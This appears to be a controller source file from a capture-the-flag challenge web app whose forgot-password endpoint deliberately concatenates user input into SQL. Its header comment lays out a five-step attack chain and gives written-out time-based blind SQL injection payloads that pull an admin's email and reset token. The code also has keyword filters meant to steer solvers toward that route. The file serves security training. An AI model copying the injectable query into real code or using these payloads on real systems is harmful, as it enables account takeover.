package com.ctf.vaultpass.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * VULNERABILITY #1 — Time-Based Blind SQL Injection
 *
 * POST /forgot-password is vulnerable to time-based blind SQL injection.
 * The "email" POST parameter is directly concatenated into the SQL query,
 * allowing an attacker to inject conditional pg_sleep() delays.
 *
 * Attack chain:
 *   1. Enumerate admin email via time-based SQLi on /forgot-password
 *   2. Send a legitimate reset request for the discovered email
 *   3. Token is written to the separate `tokens` table
 *   4. Extract the token from `tokens` via time-based SQLi
 *   5. Navigate to /reset-password?token=TOKEN → account takeover
 *
 * Step 1 payload (discover admin email, char by char):
 *   email=x' AND (SELECT CASE WHEN
 *     SUBSTRING((SELECT email FROM users WHERE is_admin=true LIMIT 1),1,1)='a'
 *   THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--
 *
 * Step 4 payload (extract token from tokens table):
 *   email=x' AND (SELECT CASE WHEN
 *     SUBSTRING((SELECT token FROM tokens WHERE user_id=
 *       (SELECT id FROM users WHERE email='aziz@chconf.uz')),1,1)='a'
 *   THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--
 */
@Controller
public class ForgotPasswordController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @Autowired
    private BCryptPasswordEncoder passwordEncoder;

    // ----------------------------------------------------------------
    // GET /forgot-password
    // ----------------------------------------------------------------
    @GetMapping("/forgot-password")
    public String forgotForm() {
        return "forgot";
    }

    // ----------------------------------------------------------------
    // POST /forgot-password  — VULNERABLE: time-based blind SQLi
    // ----------------------------------------------------------------
    @PostMapping("/forgot-password")
    public String forgotSubmit(@RequestParam String email, Model model) {
        try {
            // ================================================================
            // STACKED-QUERY GUARD
            // PostgreSQL JDBC executes stacked queries via Statement.execute().
            // Block semicolons and UNION SELECT to prevent direct DB writes
            // that would bypass the intended time-based blind SQLi chain.
            // Time-based payloads (AND ... pg_sleep ... CASE WHEN) need none
            // of these constructs, so legitimate exploitation still works.
            // ================================================================
            String lower = email.toLowerCase();
            if (lower.contains(";")
                    || (lower.contains("union") && lower.contains("select"))
                    || lower.contains("insert into")
                    || (lower.contains("update ") && lower.contains(" set "))
                    || lower.contains("delete from")
                    || lower.contains("drop ")) {
                // Silently swallow — attacker gets no feedback
                model.addAttribute("message",
                    "Agar bu elektron pochta manzili ro'yxatdan o'tgan bo'lsa, " +
                    "quyidagi formatdagi havola yuboriladi: /reset-password?token=<64-belgi>");
                return "forgot";
            }

            // !!!! VULNERABLE: direct string concatenation — time-based blind SQLi !!!!
            String sql = "SELECT id FROM users WHERE email = '" + email + "'";
            List<Map<String, Object>> rows = jdbcTemplate.queryForList(sql);

            if (!rows.isEmpty()) {
                int userId = ((Number) rows.get(0).get("id")).intValue();

                // ================================================================
                // OR-BYPASS GUARD
                // Parameterized verification: confirm that the returned userId
                // actually belongs to the submitted email string.
                // Prevents ' OR 1=1-- / ' OR is_admin=true-- bypasses:
                // the parameterized query treats the injected string as a
                // literal value, which never matches any real email.
                // Intended use (exact email) still works normally.
                // ================================================================
                Integer match = jdbcTemplate.queryForObject(
                    "SELECT COUNT(*) FROM users WHERE id = ? AND email = ?",
                    Integer.class, userId, email
                );
                if (match == null || match == 0) {
                    // OR-based injection: userId found but email didn't match
                    model.addAttribute("message",
                        "Agar bu elektron pochta manzili ro'yxatdan o'tgan bo'lsa, " +
                        "tiklash havolasi taqdim etiladi.");
                    return "forgot";
                }

                String token = UUID.randomUUID().toString().replace("-", "")
                             + UUID.randomUUID().toString().replace("-", "");

                jdbcTemplate.update("DELETE FROM tokens WHERE user_id = ?", userId);
                jdbcTemplate.update(
                    "INSERT INTO tokens (user_id, token, expires_at) " +
                    "VALUES (?, ?, NOW() + INTERVAL '2 hours')",
                    userId, token
                );
            }
        } catch (Exception ignored) {
            // Errors swallowed — blind injection only
        }

        model.addAttribute("message",
            "Agar bu elektron pochta manzili ro'yxatdan o'tgan bo'lsa, " +
            "tiklash havolasi taqdim etiladi.");
        return "forgot";
    }

    // ----------------------------------------------------------------
    // GET /reset-password?token=...
    // ----------------------------------------------------------------
    @GetMapping("/reset-password")
    public String resetForm(@RequestParam(required = false) String token, Model model) {
        if (token == null || token.isBlank()) {
            model.addAttribute("error", "Tiklash tokeni noto'g'ri yoki mavjud emas.");
            return "reset";
        }
        try {
            Integer count = jdbcTemplate.queryForObject(
                "SELECT COUNT(*) FROM tokens WHERE token = ? AND expires_at > NOW()",
                Integer.class, token
            );
            if (count == null || count == 0) {
                model.addAttribute("error", "Bu tiklash havolasi noto'g'ri yoki muddati o'tgan.");
                return "reset";
            }
            model.addAttribute("token", token);
        } catch (Exception e) {
            model.addAttribute("error", "Xato yuz berdi. Qayta urinib ko'ring.");
        }
        return "reset";
    }

    // ----------------------------------------------------------------
    // POST /reset-password
    // ----------------------------------------------------------------
    @PostMapping("/reset-password")
    public String resetSubmit(@RequestParam String token,
                              @RequestParam String newPassword,
                              @RequestParam String confirmPassword,
                              Model model) {
        if (!newPassword.equals(confirmPassword)) {
            model.addAttribute("token", token);
            model.addAttribute("error", "Parollar mos kelmaydi.");
            return "reset";
        }
        if (newPassword.length() < 8) {
            model.addAttribute("token", token);
            model.addAttribute("error", "Parol kamida 8 ta belgidan iborat bo'lishi kerak.");
            return "reset";
        }

        try {
            List<Map<String, Object>> rows = jdbcTemplate.queryForList(
                "SELECT user_id FROM tokens WHERE token = ? AND expires_at > NOW()",
                token
            );
            if (rows.isEmpty()) {
                model.addAttribute("error", "Bu tiklash havolasi noto'g'ri yoki muddati o'tgan.");
                return "reset";
            }

            int userId = ((Number) rows.get(0).get("user_id")).intValue();
            String newHash = passwordEncoder.encode(newPassword);

            jdbcTemplate.update("UPDATE users SET password_hash = ? WHERE id = ?", newHash, userId);
            jdbcTemplate.update("DELETE FROM tokens WHERE token = ?", token);

            model.addAttribute("success", "Parol muvaffaqiyatli yangilandi. Endi tizimga kirishingiz mumkin.");
            return "login";
        } catch (Exception e) {
            model.addAttribute("error", "Parolni tiklashda xatolik. Qayta urinib ko'ring.");
            return "reset";
        }
    }
}
